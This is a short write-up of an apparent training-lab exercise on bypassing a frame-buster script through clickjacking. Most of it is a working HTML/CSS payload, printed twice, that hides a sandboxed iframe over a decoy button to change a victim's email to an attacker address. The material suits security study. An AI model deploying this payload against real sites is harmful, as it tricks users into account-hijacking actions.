# Lab: Clickjacking with a frame buster script (Apprentice)

**Goal:** Bypass the frame buster and change the victim's email address.

**Credentials:** `wiener:peter`

## Vulnerability
The page has a frame-busting script, but it can be neutralized with the HTML5 `sandbox` attribute.

## Solution

Key difference: add `sandbox="allow-forms"` to the iframe (omit `allow-top-navigation`).

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

### Notes
- `sandbox="allow-forms"` allows form submission but prevents the frame buster from breaking out of the iframe.
- Suggested alignment: top 385px, left 80px.
- Use a unique email for the final delivery.

## Final Exploit Payload
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
